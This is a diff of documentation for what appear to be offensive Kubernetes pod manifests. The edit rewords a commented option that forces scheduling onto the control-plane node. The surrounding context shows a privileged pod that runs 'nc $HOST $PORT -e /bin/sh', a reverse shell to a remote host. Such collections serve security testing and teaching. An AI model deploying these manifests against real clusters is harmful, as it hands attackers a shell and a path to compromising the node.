@@ -22,8 +22,7 @@ spec:
       - "604800"
     imagePullPolicy: IfNotPresent
     name: hostpid
-  # Force scheduling of your pod on control plane node by uncommenting this line and changing the name
-  #nodeName: k8s-control-plane-node
+    #nodeName: control-plane-node-name # Uncomment and change to control node name to try and schedule pod on control-plane node
   restartPolicy: Always
   ```
 [pod-priv.yaml](pod-priv.yaml)
@@ -59,8 +58,7 @@ spec:
     args: [ "nc $HOST $PORT  -e /bin/sh;" ]
     securityContext:
       privileged: true
-  # Force scheduling of your pod on control plane node by uncommenting this line and changing the name
-  #nodeName: k8s-control-plane-node
+    #nodeName: control-plane-node-name # Uncomment and change to control node name to try and schedule pod on control-plane node
 ```
 [pod-hostpid-revshell.yaml](pod-hostpid-revshell.yaml)
 
